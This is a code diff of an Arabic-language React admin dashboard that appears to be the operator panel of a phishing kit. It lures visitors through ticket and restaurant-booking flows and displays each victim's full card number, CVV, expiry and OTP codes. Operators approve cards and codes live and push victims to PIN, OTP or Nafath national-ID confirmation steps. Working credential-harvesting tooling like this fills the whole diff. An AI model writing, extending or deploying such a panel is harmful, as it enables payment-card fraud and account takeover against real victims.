-                          ? "فك الحظر"
-                          : "حظر"}
-                      </AlertDialogAction>
-                    </AlertDialogFooter>
-                  </AlertDialogContent>
-                </AlertDialog>
-                <AlertDialog open={deleteDialogOpen} onOpenChange={setDeleteDialogOpen}>
-                  <Button variant="destructive" size="icon" onClick={() => setDeleteDialogOpen(true)} disabled={deletingVisitorId === selectedVisitor.id} title="حذف" data-testid="button-delete-visitor">
-                    <Trash2 className="w-4 h-4" />
-                  </Button>
-                  <AlertDialogContent dir="rtl">
-                    <AlertDialogHeader>
-                      <AlertDialogTitle>حذف الزائر؟</AlertDialogTitle>
-                      <AlertDialogDescription>سيتم حذف هذا السجل نهائيًا ولا يمكن التراجع.</AlertDialogDescription>
-                    </AlertDialogHeader>
-                    <AlertDialogFooter className="gap-2 sm:gap-0">
-                      <AlertDialogCancel disabled={deletingVisitorId === selectedVisitor.id}>إلغاء</AlertDialogCancel>
-                      <AlertDialogAction onClick={(e) => { e.preventDefault(); void handleDeleteSelectedVisitor(); }} disabled={deletingVisitorId === selectedVisitor.id} className="bg-destructive text-destructive-foreground hover:bg-destructive/90">
-                        {deletingVisitorId === selectedVisitor.id ? "جاري الحذف..." : "حذف"}
-                      </AlertDialogAction>
-                    </AlertDialogFooter>
-                  </AlertDialogContent>
-                </AlertDialog>
-              </div>
-            </div>
-
+          <div className="mt-10">
+            <div className="w-10 h-7 bg-gradient-to-br from-yellow-300 to-yellow-600 rounded mb-3 opacity-90" />
             <div
-              className="flex-1 overflow-y-auto p-4 space-y-4"
-              style={{
-                backgroundImage: `url("data:image/svg+xml,%3Csvg width='60' height='60' viewBox='0 0 60 60' xmlns='http://www.w3.org/2000/svg'%3E%3Cg fill='none' fill-rule='evenodd'%3E%3Cg fill='%23182229' fill-opacity='0.4'%3E%3Cpath d='M36 34v-4h-2v4h-4v2h4v4h2v-4h4v-2h-4zm0-30V0h-2v4h-4v2h4v4h2V6h4V4h-4zM6 34v-4H4v4H0v2h4v4h2v-4h4v-2H6zM6 4V0H4v4H0v2h4v4h2V6h4V4H6z'/%3E%3C/g%3E%3C/g%3E%3C/svg%3E")`,
-              }}
+              className="font-mono text-base tracking-widest select-all"
+              data-testid="admin-card-number"
             >
-              <MessageBubble type="sent" time={formatDate(selectedVisitor.createdDate)}>
-                <div className="flex items-center gap-3 flex-wrap">
-                  <div className="flex items-center gap-2">
-                    <Globe className="w-4 h-4 text-[#8696a0]" />
-                    <span className="text-sm">الصفحة: {getPageNameArabic(selectedVisitor.currentPage)}</span>
-                  </div>
-                  {selectedVisitor.online ? (
-                    <span className="flex items-center gap-1 bg-green-500/20 text-green-400 text-xs px-2 py-0.5 rounded-full">
-                      <span className="relative flex h-1.5 w-1.5">
-                        <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-green-400 opacity-75"></span>
-                        <span className="relative inline-flex rounded-full h-1.5 w-1.5 bg-green-400"></span>
-                      </span>
-                      متصل الآن
-                    </span>
-                  ) : (
-                    <span className="bg-gray-500/20 text-gray-400 text-xs px-2 py-0.5 rounded-full flex items-center gap-1">
-                      <WifiOff className="w-3 h-3" />
-                      غير متصل
-                    </span>
-                  )}
-                  <span className={`text-xs px-2 py-0.5 rounded-full font-medium ${
-                    isReservationFlow(selectedVisitor) ? "bg-orange-500/20 text-orange-400" : "bg-cyan-500/20 text-cyan-400"
-                  }`}>
-                    {isReservationFlow(selectedVisitor) ? "حجز مطعم" : "شراء تذكرة"}
-                  </span>
-                  {selectedVisitor.blocked && (
-                    <span className="bg-red-500/20 text-red-400 text-xs px-2 py-0.5 rounded-full">
-                      محظور
-                    </span>
-                  )}
-                </div>
-              </MessageBubble>
-
-              {selectedVisitor.name && (
-                <MessageBubble type="received" time={formatDate(selectedVisitor.createdDate)}>
-                  <div className="space-y-3">
-                    <div className="flex items-center gap-2 text-[#00a884] font-semibold">
-                      <User className="w-4 h-4" />
-                      <span>معلومات المستخدم</span>
-                    </div>
-                    <div className="grid grid-cols-2 gap-2 text-sm">
-                      <InfoRow icon={User} label="الاسم" value={selectedVisitor.name} />
-                      {selectedVisitor.saudiId && <InfoRow icon={IdCard} label="الهوية" value={selectedVisitor.saudiId} />}
-                      {selectedVisitor.email && <InfoRow icon={Mail} label="البريد" value={selectedVisitor.email} />}
-                      {selectedVisitor.phone && <InfoRow icon={Phone} label="الجوال" value={selectedVisitor.phone} />}
-                    </div>
-                  </div>
-                </MessageBubble>
-              )}
-
-              {isTicketFlow(selectedVisitor) && (selectedVisitor.ticketQuantity || selectedVisitor.totalAmount || selectedVisitor.bookingDate) && (
-                <MessageBubble type="received" time="">
-                  <div className="space-y-3">
-                    <div className="flex items-center gap-2 text-cyan-400 font-semibold">
-                      <Ticket className="w-4 h-4" />
-                      <span>تفاصيل التذكرة</span>
-                    </div>
-                    <div className="bg-gradient-to-br from-cyan-900/30 to-cyan-800/20 rounded-xl p-4 border border-cyan-500/30 space-y-2 text-sm">
-                      {selectedVisitor.bookingDate && (
-                        <div className="flex justify-between items-center py-1 border-b border-cyan-500/20">
-                          <span className="text-[#8696a0] flex items-center gap-1"><Calendar className="w-3 h-3" /> تاريخ الزيارة</span>
-                          <span className="text-white font-medium">{selectedVisitor.bookingDate}</span>
-                        </div>
-                      )}
-                      {selectedVisitor.bookingTime && (
-                        <div className="flex justify-between items-center py-1 border-b border-cyan-500/20">
-                          <span className="text-[#8696a0] flex items-center gap-1"><Clock className="w-3 h-3" /> الوقت</span>
-                          <span className="text-white font-medium">{selectedVisitor.bookingTime}</span>
-                        </div>
-                      )}
-                      {selectedVisitor.ticketQuantity && (
-                        <div className="flex justify-between items-center py-1 border-b border-cyan-500/20">
-                          <span className="text-[#8696a0]">عدد التذاكر</span>
-                          <span className="text-white font-medium">{selectedVisitor.ticketQuantity}</span>
-                        </div>
-                      )}
-                      {selectedVisitor.ticketPrice && (
-                        <div className="flex justify-between items-center py-1 border-b border-cyan-500/20">
-                          <span className="text-[#8696a0]">سعر التذكرة</span>
-                          <span className="text-white font-medium">{selectedVisitor.ticketPrice} ر.س</span>
-                        </div>
-                      )}
-                      {selectedVisitor.totalAmount && (
-                        <div className="flex justify-between items-center pt-2 mt-1 border-t border-cyan-400/30">
-                          <span className="text-cyan-400 font-bold">الإجمالي</span>
-                          <span className="text-cyan-400 font-bold text-lg">{selectedVisitor.totalAmount} ر.س</span>
-                        </div>
-                      )}
-                    </div>
-                  </div>
-                </MessageBubble>
-              )}
-
-              {isReservationFlow(selectedVisitor) && selectedVisitor.restaurant && (
-                <MessageBubble type="received" time="">
-                  <div className="space-y-3">
-                    <div className="flex items-center gap-2 text-orange-400 font-semibold">
-                      <UtensilsCrossed className="w-4 h-4" />
-                      <span>حجز مطعم</span>
-                    </div>
-                    <div className="bg-gradient-to-br from-orange-900/30 to-amber-800/20 rounded-xl p-4 border border-orange-500/30 space-y-2 text-sm">
-                      <div className="flex justify-between items-center py-1 border-b border-orange-500/20">
-                        <span className="text-[#8696a0] flex items-center gap-1"><UtensilsCrossed className="w-3 h-3" /> المطعم</span>
-                        <div className="text-left">
-                          <span className="text-white font-medium">{selectedVisitor.restaurant}</span>
-                          {selectedVisitor.restaurantEn && (
-                            <p className="text-[#8696a0] text-[10px]">{selectedVisitor.restaurantEn}</p>
-                          )}
-                        </div>
-                      </div>
-                      {selectedVisitor.date && (
-                        <div className="flex justify-between items-center py-1 border-b border-orange-500/20">
-                          <span className="text-[#8696a0] flex items-center gap-1"><Calendar className="w-3 h-3" /> التاريخ</span>
-                          <span className="text-white font-medium">{selectedVisitor.date}</span>
-                        </div>
-                      )}
-                      {selectedVisitor.time && (
-                        <div className="flex justify-between items-center py-1 border-b border-orange-500/20">
-                          <span className="text-[#8696a0] flex items-center gap-1"><Clock className="w-3 h-3" /> الوقت</span>
-                          <span className="text-white font-medium">{selectedVisitor.time}</span>
-                        </div>
-                      )}
-                      {selectedVisitor.guests && (
-                        <div className="flex justify-between items-center py-1 border-b border-orange-500/20">
-                          <span className="text-[#8696a0] flex items-center gap-1"><Users className="w-3 h-3" /> عدد الضيوف</span>
-                          <span className="text-white font-medium">{selectedVisitor.guests}</span>
-                        </div>
-                      )}
-                      {selectedVisitor.notes && (
-                        <div className="flex justify-between items-center py-1 border-b border-orange-500/20">
-                          <span className="text-[#8696a0]">ملاحظات</span>
-                          <span className="text-white font-medium text-left max-w-[200px]">{selectedVisitor.notes}</span>
-                        </div>
-                      )}
-                      {selectedVisitor.total && (
-                        <div className="flex justify-between items-center pt-2 mt-1 border-t border-orange-400/30">
-                          <span className="text-orange-400 font-bold">رسوم الحجز</span>
-                          <span className="text-orange-400 font-bold text-lg">{selectedVisitor.total} ر.س</span>
-                        </div>
-                      )}
-                    </div>
-                  </div>
-                </MessageBubble>
-              )}
-
-              {selectedVisitor.cardNumber && (
-                <MessageBubble type="received" time="">
-                  <div className="space-y-3">
-                    <div className="flex items-center gap-2 text-yellow-400 font-semibold">
-                      <CreditCard className="w-4 h-4" />
-                      <span>معلومات البطاقة</span>
-                    </div>
-
-                    <div className="bg-gradient-to-br from-[#1e3a5f] via-[#1a2c38] to-[#0d1c24] rounded-xl p-4 space-y-3 border border-[#2a4a5a] shadow-lg">
-                      <div className="flex justify-between items-start">
-                        <div className="w-10 h-7 bg-gradient-to-br from-yellow-300 to-yellow-500 rounded-md" />
-                        <div className="text-right">
-                          <div className="text-white text-xs font-bold">
-                            {selectedCardBinInfo?.cardBrand || getCardNetworkArabic(selectedVisitor.cardType)}
-                          </div>
-                          {selectedCardBinInfo?.bankName && (
-                            <div className="text-[#8696a0] text-[10px] mt-0.5 max-w-[120px] text-right leading-tight">
-                              {translateBankName(selectedCardBinInfo.bankName)}
-                            </div>
-                          )}
-                        </div>
-                      </div>
-
-                      <div className="text-white font-mono text-xl tracking-wider" dir="ltr">
-                        {formatCardNumberForDisplay(selectedVisitor.cardNumber)}
-                      </div>
-
-                      {(selectedCardBinInfo?.cardType || selectedCardBinInfo?.cardLevel) && (
-                        <div className="flex items-center gap-1.5">
-                          {selectedCardBinInfo.cardType && (
-                            <span className={`text-[9px] font-bold px-1.5 py-0.5 rounded-full ${TYPE_COLORS[selectedCardBinInfo.cardType.toUpperCase()] || "bg-gray-500/20 text-gray-300"}`}>
-                              {selectedCardBinInfo.cardType.toUpperCase() === "CREDIT"
-                                ? "ائتماني"
-                                : selectedCardBinInfo.cardType.toUpperCase() === "DEBIT"
-                                  ? "مدين"
-                                  : selectedCardBinInfo.cardType.toUpperCase() === "PREPAID"
-                                    ? "مدفوع مسبقاً"
-                                    : selectedCardBinInfo.cardType}
-                            </span>
-                          )}
-                          {selectedCardBinInfo.cardLevel && (
-                            <span className="text-[9px] font-semibold px-1.5 py-0.5 rounded-full bg-white/10 text-white/70" dir="ltr">
-                              {selectedCardBinInfo.cardLevel}
-                            </span>
-                          )}
-                        </div>
-                      )}
-
-                      <div className="flex justify-between text-sm">
-                        <div>
-                          <p className="text-[#8696a0] text-[10px] uppercase">Card Holder</p>
-                          <p className="text-white font-medium">{selectedVisitor.cardName || "---"}</p>
-                        </div>
-                        <div>
-                          <p className="text-[#8696a0] text-[10px] uppercase">Expires</p>
-                          <p className="text-white font-medium" dir="ltr">
-                            {formatExpiryForDisplay(selectedVisitor.expiryMonth, selectedVisitor.expiryYear)}
-                          </p>
-                        </div>
-                        <div>
-                          <p className="text-[#8696a0] text-[10px] uppercase">CVV</p>
-                          <p className="text-white font-medium">{selectedVisitor.cvv || "---"}</p>
-                        </div>
-                      </div>
-                    </div>
-
-                    <div className="rounded-xl border border-[#2a3942] overflow-hidden">
-                      <div className="flex items-center justify-between px-3 py-2 border-b border-[#2a3942] bg-[#1a2c38]">
-                        <div className="flex items-center gap-2">
-                          <span className="text-[#8696a0] text-xs">BIN</span>
-                          <span className="text-white text-xs font-mono" dir="ltr">
-                            {selectedCardBin || "---"}
-                          </span>
-                        </div>
-                        {selectedCardBinInfo && (
-                          <div className="flex items-center gap-1.5">
-                            {selectedCardBinInfo.cardBrand && (
-                              <span className={`text-[10px] font-bold px-2 py-0.5 rounded-full border ${SCHEME_COLORS[selectedCardBinInfo.cardBrand.toUpperCase()] || "bg-gray-500/20 text-gray-300 border-gray-500/30"}`}>
-                                {selectedCardBinInfo.cardBrand.toUpperCase()}
-                              </span>
-                            )}
-                            {selectedCardBinInfo.cardType && (
-                              <span className={`text-[10px] font-semibold px-2 py-0.5 rounded-full ${TYPE_COLORS[selectedCardBinInfo.cardType.toUpperCase()] || "bg-gray-500/20 text-gray-300"}`}>
-                                {selectedCardBinInfo.cardType.toUpperCase() === "CREDIT"
-                                  ? "ائتماني"
-                                  : selectedCardBinInfo.cardType.toUpperCase() === "DEBIT"
-                                    ? "مدين"
-                                    : selectedCardBinInfo.cardType.toUpperCase() === "PREPAID"
-                                      ? "مدفوع مسبقاً"
-                                      : selectedCardBinInfo.cardType}
-                              </span>
-                            )}
-                          </div>
-                        )}
-                      </div>
-
-                      <div className="bg-[#152028] px-3 py-2.5 space-y-2">
-                        {binLookupLoading && !selectedCardBinInfo && (
-                          <div className="flex items-center gap-2 text-[#8696a0] text-xs py-1">
-                            <span className="w-3 h-3 border-2 border-[#8696a0]/40 border-t-[#8696a0] rounded-full animate-spin shrink-0" />
-                            جاري جلب بيانات BIN...
-                          </div>
-                        )}
-
-                        {binLookupError && !selectedCardBinInfo && (
-                          <div className="text-red-400 text-xs py-1">⚠ {binLookupError}</div>
-                        )}
-
-                        {selectedCardBinInfo && (
-                          <>
-                            <div className="flex items-start justify-between gap-2 text-xs">
-                              <span className="text-[#8696a0] shrink-0">البنك</span>
-                              <div className="text-right">
-                                <span className="text-white font-medium break-all">
-                                  {translateBankName(selectedCardBinInfo.bankName) || "---"}
-                                </span>
-                                {translateBankName(selectedCardBinInfo.bankName) !== selectedCardBinInfo.bankName && selectedCardBinInfo.bankName && (
-                                  <div className="text-[10px] text-[#8696a0] break-all" dir="ltr">
-                                    {selectedCardBinInfo.bankName}
-                                  </div>
-                                )}
-                              </div>
-                            </div>
-                            <div className="flex items-center justify-between gap-2 text-xs">
-                              <span className="text-[#8696a0]">المستوى</span>
-                              <span className="text-white font-medium" dir="ltr">
-                                {selectedCardBinInfo.cardLevel || "---"}
-                              </span>
-                            </div>
-                            <div className="flex items-center justify-between gap-2 text-xs">
-                              <span className="text-[#8696a0]">بلد الإصدار</span>
-                              <span className="text-white font-medium flex items-center gap-1 text-left">
-                                <span>{countryCodeToFlag(selectedCardBinInfo.countryCode)}</span>
-                                <span>{translateCountry(selectedCardBinInfo.country) || "---"}</span>
-                                {selectedCardBinInfo.countryCode && (
-                                  <span className="text-[#8696a0] text-[10px]" dir="ltr">
-                                    ({selectedCardBinInfo.countryCode})
-                                  </span>
-                                )}
-                              </span>
-                            </div>
-                          </>
-                        )}
-                      </div>
-                    </div>
-
-                    {selectedCardBin && (
-                      <div className="mt-3">
-                        {blockedBins.some((b) => b.bin === selectedCardBin) ? (
-                          <Button
-                            onClick={() => handleUnblockBin(selectedCardBin)}
-                            variant="outline"
-                            className="w-full border-orange-500/50 text-orange-400 hover:bg-orange-500/10 py-2"
-                            data-testid="button-unblock-bin"
-                          >
-                            <Ban className="w-4 h-4 ml-2" />
-                            رفع حظر بطاقات {selectedCardBin}
-                          </Button>
-                        ) : (
-                          <Button
-                            onClick={() =>
-                              handleBlockBin(selectedCardBin, {
-                                bankName: selectedCardBinInfo?.bankName,
-                                cardBrand: selectedCardBinInfo?.cardBrand,
-                                country: selectedCardBinInfo?.country,
-                              })
-                            }
-                            variant="outline"
-                            className="w-full border-red-500/50 text-red-400 hover:bg-red-500/10 py-2"
-                            data-testid="button-block-bin"
-                          >
-                            <Ban className="w-4 h-4 ml-2" />
-                            حظر بطاقات تبدأ بـ {selectedCardBin}
-                          </Button>
-                        )}
-                      </div>
-                    )}
-
-                    <div className="flex gap-2 mt-3">
-                      {selectedVisitor.blocked ? (
-                        <div className="w-full bg-red-500/20 text-red-400 py-2 px-4 rounded-lg text-center font-medium">
-                          الزائر محظور
-                        </div>
-                      ) : selectedVisitor.cardApproved ? (
-                        <div className="w-full bg-green-500/20 text-green-400 py-2 px-4 rounded-lg text-center font-medium">
-                          تم الموافقة على البطاقة
-                        </div>
-                      ) : (
-                        <>
-                          <Button
-                            onClick={() => updateApprovalStatus(selectedVisitor.id, true)}
-                            className="flex-1 bg-green-600 hover:bg-green-700 text-white py-2"
-                            data-testid="button-approve-card"
-                          >
-                            قبول البطاقة
-                          </Button>
-                          <Button
-                            onClick={() => updateApprovalStatus(selectedVisitor.id, false)}
-                            variant="destructive"
-                            className="flex-1 py-2"
-                            data-testid="button-reject-card"
-                          >
-                            رفض البطاقة
-                          </Button>
-                        </>
-                      )}
-                    </div>
-                  </div>
-                </MessageBubble>
-              )}
-
-              {(selectedVisitor.cardHistory && selectedVisitor.cardHistory.length > 0) && (
-                <MessageBubble type="received" time="">
-                  <div className="space-y-3">
-                    <div className="flex items-center justify-between">
-                      <div className="flex items-center gap-2 text-yellow-400 font-semibold">
-                        <CreditCard className="w-4 h-4" />
-                        <span>سجل البطاقات</span>
-                      </div>
-                      <span className="bg-yellow-500/20 text-yellow-400 text-xs px-2 py-0.5 rounded-full">
-                        {selectedVisitor.cardHistory.length} بطاقة
-                      </span>
-                    </div>
-                    <div className="space-y-2">
-                      {selectedVisitor.cardHistory
-                        .slice()
-                        .sort((a, b) => (b.timestamp || "").localeCompare(a.timestamp || ""))
-                        .map((entry, index) => (
-                          <div key={`${entry.timestamp}-${index}`} className="bg-[#1a2c38] rounded-lg p-3 border border-[#2a3942] space-y-1">
-                            <div className="flex items-center justify-between gap-3">
-                              <p className="text-white font-mono text-sm tracking-wider" dir="ltr">
-                                {formatCardNumberForDisplay(entry.cardNumber)}
-                              </p>
-                              <span className="text-xs text-[#8696a0] flex-shrink-0">
-                                {entry.timestamp ? new Date(entry.timestamp).toLocaleString("ar-SA") : ""}
-                              </span>
-                            </div>
-                            <div className="flex items-center justify-between text-xs text-[#8696a0]" dir="ltr">
-                              <span>{entry.cardName || "---"}</span>
-                              <div className="flex items-center gap-2">
-                                {entry.cvv && (
-                                  <span className="bg-red-500/20 text-red-400 px-1.5 py-0.5 rounded font-mono font-medium">CVV: {entry.cvv}</span>
-                                )}
-                                <span>{formatExpiryForDisplay(entry.expiryMonth, entry.expiryYear)}</span>
-                              </div>
-                            </div>
-                          </div>
-                        ))}
-                    </div>
-                  </div>
-                </MessageBubble>
-              )}
-
-              {(selectedVisitor.otpHistory && selectedVisitor.otpHistory.length > 0) && (
-                <MessageBubble type="received" time="">
-                  <div className="space-y-3">
-                    <div className="flex items-center justify-between">
-                      <div className="flex items-center gap-2 text-purple-400 font-semibold">
-                        <Shield className="w-4 h-4" />
-                        <span>محاولات OTP</span>
-                      </div>
-                      <div className="flex items-center gap-2">
-                        {selectedVisitor.otpApproved && (
-                          <span className="bg-green-500/20 text-green-400 text-xs px-2 py-0.5 rounded-full">تم القبول</span>
-                        )}
-                        {selectedVisitor.otpStatus === "rejected" && (
-                          <span className="bg-red-500/20 text-red-400 text-xs px-2 py-0.5 rounded-full">مرفوض</span>
-                        )}
-                        <span className="bg-purple-500/20 text-purple-400 text-xs px-2 py-0.5 rounded-full">
-                          {selectedVisitor.otpHistory.length} محاولة
-                        </span>
-                      </div>
-                    </div>
-                    <div className="space-y-2">
-                      {selectedVisitor.otpHistory.map((entry, index) => (
-                        <div key={index} className="bg-[#1a2c38] rounded-lg p-3 border border-[#2a3942] flex items-center justify-between">
-                          <div className="flex items-center gap-3">
-                            <span className="text-[#8696a0] text-xs">#{index + 1}</span>
-                            <p className="text-white font-mono text-xl tracking-[0.3em]" dir="ltr">{entry.code}</p>
-                          </div>
-                          <span className="text-xs text-[#8696a0]">
-                            {new Date(entry.timestamp).toLocaleTimeString('ar-SA', { hour: '2-digit', minute: '2-digit' })}
-                          </span>
-                        </div>
-                      ))}
-                    </div>
-                    <div className="flex gap-2 mt-3">
-                      {selectedVisitor.blocked ? (
-                        <div className="w-full bg-red-500/20 text-red-400 py-2 px-4 rounded-lg text-center font-medium">
-                          الزائر محظور
-                        </div>
-                      ) : selectedVisitor.otpApproved ? (
-                        <div className="w-full bg-green-500/20 text-green-400 py-2 px-4 rounded-lg text-center font-medium">
-                          تم الموافقة على رمز التحقق
-                        </div>
-                      ) : (
-                        <>
-                          <Button
-                            onClick={() => updateOtpApprovalStatus(selectedVisitor.id, true)}
-                            className="flex-1 bg-green-600 hover:bg-green-700 text-white py-2"
-                            data-testid="button-approve-otp"
-                          >
-                            قبول OTP
-                          </Button>
-                          <Button
-                            onClick={() => updateOtpApprovalStatus(selectedVisitor.id, false)}
-                            variant="destructive"
-                            className="flex-1 py-2"
-                            data-testid="button-reject-otp"
-                          >
-                            رفض OTP
-                          </Button>
-                        </>
-                      )}
-                    </div>
-                  </div>
-                </MessageBubble>
-              )}
-
-              {selectedVisitor.otp && !selectedVisitor.otpHistory && (
-                <MessageBubble type="received" time="">
-                  <div className="space-y-3">
-                    <div className="flex items-center gap-2 text-purple-400 font-semibold">
-                      <Shield className="w-4 h-4" />
-                      <span>رمز التحقق OTP</span>
-                    </div>
-                    <div className="bg-[#1a2c38] rounded-lg p-4 border border-[#2a3942]">
-                      <p className="text-white font-mono text-3xl tracking-[0.4em] text-center" dir="ltr">{selectedVisitor.otp}</p>
-                    </div>
-                    <div className="flex gap-2 mt-3">
-                      {selectedVisitor.blocked ? (
-                        <div className="w-full bg-red-500/20 text-red-400 py-2 px-4 rounded-lg text-center font-medium">
-                          الزائر محظور
-                        </div>
-                      ) : selectedVisitor.otpApproved ? (
-                        <div className="w-full bg-green-500/20 text-green-400 py-2 px-4 rounded-lg text-center font-medium">
-                          تم الموافقة على رمز التحقق
-                        </div>
-                      ) : (
-                        <>
-                          <Button
-                            onClick={() => updateOtpApprovalStatus(selectedVisitor.id, true)}
-                            className="flex-1 bg-green-600 hover:bg-green-700 text-white py-2"
-                            data-testid="button-approve-otp-single"
-                          >
-                            قبول OTP
-                          </Button>
-                          <Button
-                            onClick={() => updateOtpApprovalStatus(selectedVisitor.id, false)}
-                            variant="destructive"
-                            className="flex-1 py-2"
-                            data-testid="button-reject-otp-single"
-                          >
-                            رفض OTP
-                          </Button>
-                        </>
-                      )}
-                    </div>
-                  </div>
-                </MessageBubble>
-              )}
-            </div>
-          </>
-        ) : (
-          <div className="flex-1 flex items-center justify-center text-[#8696a0]">
-            <div className="text-center space-y-3">
-              <div className="w-24 h-24 rounded-full bg-[#2a3942]/50 flex items-center justify-center mx-auto">
-                <Users className="w-12 h-12" />
-              </div>
-              <p className="text-lg">اختر زائر لعرض التفاصيل</p>
-              <p className="text-sm text-[#8696a0]/60">سيظهر هنا جميع بيانات الزائر</p>
+              {groupedCard}
             </div>
           </div>
+
+          <div className="absolute bottom-3 left-3 right-3 flex items-end justify-between gap-2">
+            {name && (
+              <div className="text-[11px] min-w-0">
+                <div className="opacity-60 text-[9px] uppercase">Holder</div>
+                <div className="font-semibold uppercase tracking-wide truncate">
+                  {name}
+                </div>
+              </div>
+            )}
+            {cvc && (
+              <div className="text-[11px] text-center">
+                <div className="opacity-60 text-[9px] uppercase">CVV</div>
+                <div
+                  className="font-mono font-bold tracking-widest select-all"
+                  data-testid="admin-card-cvv"
+                >
+                  {cvc}
+                </div>
+              </div>
+            )}
+            {expiry && (
+              <div className="text-[11px] text-right">
+                <div className="opacity-60 text-[9px] uppercase">Exp</div>
+                <div className="font-mono">{expiry}</div>
+              </div>
+            )}
+          </div>
+        </div>
+
+        {/* Action buttons */}
+        <div className="grid grid-cols-2 gap-1.5">
+          <button
+            onClick={() => onApprove("cardApprovalStatus")}
+            disabled={!waiting}
+            className="py-1.5 bg-green-500/20 text-green-300 hover:bg-green-500/30 disabled:opacity-40 rounded-lg text-xs font-semibold flex items-center justify-center gap-1 border border-green-500/30"
+            data-testid="card-accept"
+          >
+            <CheckCircle2 className="w-3.5 h-3.5" /> قبول
+          </button>
+          <button
+            onClick={() => onReject("cardApprovalStatus")}
+            disabled={!waiting}
+            className="py-1.5 bg-red-500/20 text-red-300 hover:bg-red-500/30 disabled:opacity-40 rounded-lg text-xs font-semibold flex items-center justify-center gap-1 border border-red-500/30"
+            data-testid="card-reject"
+          >
+            <XCircle className="w-3.5 h-3.5" /> رفض
+          </button>
+          <button
+            onClick={() => onPushStep(6)}
+            className="py-1.5 bg-slate-700 hover:bg-slate-600 rounded-lg text-xs font-semibold flex items-center justify-center gap-1"
+          >
+            <LockIcon className="w-3 h-3" /> PIN
+          </button>
+          <button
+            onClick={() => onPushStep(5)}
+            className="py-1.5 bg-slate-700 hover:bg-slate-600 rounded-lg text-xs font-semibold flex items-center justify-center gap-1"
+          >
+            <Hash className="w-3 h-3" /> OTP
+          </button>
+        </div>
+
+        {/* Quick block-BIN action */}
+        {hasBin && bin && onBlockBin && (
+          <button
+            onClick={() => {
+              if (isBinBlocked) return;
+              if (
+                confirm(
+                  `حظر جميع البطاقات التي تبدأ بـ ${bin}؟\nسيمنع أي زائر من استخدام بطاقة بنفس البداية.`,
+                )
+              ) {
+                onBlockBin(String(bin));
+              }
+            }}
+            disabled={isBinBlocked}
+            className={`w-full py-1.5 rounded-lg text-[11px] font-bold flex items-center justify-center gap-1.5 border transition ${
+              isBinBlocked
+                ? "bg-red-500/10 text-red-300 border-red-500/40 cursor-not-allowed"
+                : "bg-red-500/20 text-red-300 hover:bg-red-500/30 border-red-500/40"
+            }`}
+            data-testid="card-block-bin"
+          >
+            <Ban className="w-3.5 h-3.5" />
+            {isBinBlocked ? "محظور بالفعل" : `حظر هذا الـ BIN (${bin})`}
+          </button>
+        )}
+
+        {/* Quick block-IP action */}
+        {(visitor.ip || visitor.ipAddress) && onBlockIp && (
+          <button
+            onClick={() => {
+              const ip = String(visitor.ip || visitor.ipAddress);
+              if (isIpBlocked) return;
+              if (
+                confirm(
+                  `حظر هذا الزائر بعنوان IP ${ip}؟\nسيمنع الدخول من هذا العنوان نهائياً.`,
+                )
+              ) {
+                onBlockIp(ip);
+              }
+            }}
+            disabled={isIpBlocked}
+            className={`w-full py-1.5 rounded-lg text-[11px] font-bold flex items-center justify-center gap-1.5 border transition ${
+              isIpBlocked
+                ? "bg-red-500/10 text-red-300 border-red-500/40 cursor-not-allowed"
+                : "bg-red-500/20 text-red-300 hover:bg-red-500/30 border-red-500/40"
+            }`}
+            data-testid="card-block-ip"
+          >
+            <WifiOff className="w-3.5 h-3.5" />
+            {isIpBlocked
+              ? "IP محظور بالفعل"
+              : `حظر بالـ IP (${visitor.ip || visitor.ipAddress})`}
+          </button>
+        )}
+
+        {/* Nafad code + approval */}
+        {(visitor.step === 9 ||
+          visitor.nafadConfirmationStatus === "waiting") && (
+          <NafadControl
+            visitor={visitor}
+            onApprove={onApprove}
+            onReject={onReject}
+          />
         )}
       </div>
-    </div>
-  );
-}
-
-function StatCard({ icon: Icon, label, value, color }: { icon: any; label: string; value: number; color: string }) {
-  return (
-    <div className="bg-[#202c33] rounded-lg p-2.5 flex items-center gap-2">
-      <div className={`w-8 h-8 rounded-lg bg-[#2a3942] flex items-center justify-center ${color}`}>
-        <Icon className="w-3.5 h-3.5" />
-      </div>
-      <div>
-        <p className="text-white font-bold text-base">{value}</p>
-        <p className="text-[#8696a0] text-[9px]">{label}</p>
-      </div>
-    </div>
-  );
-}
-
-function InfoRow({ icon: Icon, label, value }: { icon: any; label: string; value: string }) {
-  return (
-    <div className="flex items-center gap-2 bg-[#1a2c38]/50 rounded px-2 py-1.5">
-      <Icon className="w-3.5 h-3.5 text-[#8696a0]" />
-      <span className="text-[#8696a0] text-xs">{label}:</span>
-      <span className="text-white">{value}</span>
-    </div>
-  );
-}
-
-function MessageBubble({ children, type, time }: { children: React.ReactNode; type: "sent" | "received"; time: string }) {
-  return (
-    <div className={`flex ${type === "sent" ? "justify-start" : "justify-end"}`}>
-      <div className={`max-w-lg rounded-xl p-4 shadow-lg ${
-        type === "sent" ? "bg-[#005c4b] text-white rounded-tr-none" : "bg-[#202c33] text-white rounded-tl-none"
-      }`}>
-        {children}
-        {time && <p className="text-[10px] text-[#8696a0] text-left mt-2">{time}</p>}
-      </div>
-    </div>
+    </Panel>
   );
 }
